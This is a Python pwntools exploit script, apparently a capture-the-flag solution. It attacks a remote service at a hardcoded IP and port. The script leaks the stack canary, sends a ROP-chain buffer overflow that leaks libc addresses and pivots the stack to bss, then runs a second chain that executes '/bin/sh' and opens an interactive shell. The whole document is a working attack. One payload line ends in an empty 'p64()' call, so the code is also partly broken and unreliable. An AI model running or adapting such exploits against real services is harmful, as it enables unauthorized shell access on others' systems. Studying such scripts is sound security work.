from pwn import *

#s = process("/root/random")
s = remote("69.90.132.40",4000)

poprdi = 0x0000000000400f63
movrdxrsi = 0x0000000000400f88
poprsir12 = 0x0000000000400f61
got = 0x0000000000601FF8
syscall = 0x0000000000400f8f
popraxrdi = 0x0000000000400f8c
bss = 0x602F00
poprspp3 = 0x0000000000400f5d

def leak_64bit(data=""):
	for i in range(1,8):
		s.recvuntil("want to get?\n")
		s.sendline(str(i))
		s.recvuntil("Your value = ")
		data = hex(int(s.recvline())) + data
	data = "0x" + data.replace("0x","")
	leak = int(data,0)
	return leak



canary = leak_64bit("0x00")
s.recvuntil("want to get?\n")
s.sendline("0")
s.recvuntil("Leave a comment: ")
payload  = "a"*0x408 + p64(canary) + "b"*8
payload += p64(poprsir12) + p64(0x100) +p64(0)
payload += p64(movrdxrsi) + p64(poprsir12) + p64(got) + p64(0)
payload += p64(popraxrdi) + p64(1) + p64(1)
payload += p64(syscall) + p64(popraxrdi) + p64(0) + p64(0)
payload += p64(poprsir12) + p64(bss) +p64(0)
payload += p64(syscall) + p64(poprspp3) + p64(bss) + ' '
payload += p64(0)*3 + p64(
)
s.sendline(payload)

data = s.recv(1024)[0x20:0x20+16]
libc_printf = u64(data[0:8])
libc_base = u64(data[8:16]) - 0x000000000006fe70
libc_system = libc_base + 0x0000000000045390
libc_binsh = libc_base + 0x18c177
print hex(libc_base)
s.sendline("0")
s.recvuntil("Leave a comment: ")
payload  = "a"*0x408 + p64(canary) + "b"*8
payload += p64(poprsir12) + p64(0x0) +p64(0)
payload += p64(movrdxrsi)
payload += p64(popraxrdi) + p64(59) + p64(libc_binsh)
payload += p64(syscall) + p64(popraxrdi) + p64(0) + p64(0)
s.sendline(payload)
s.interactive()
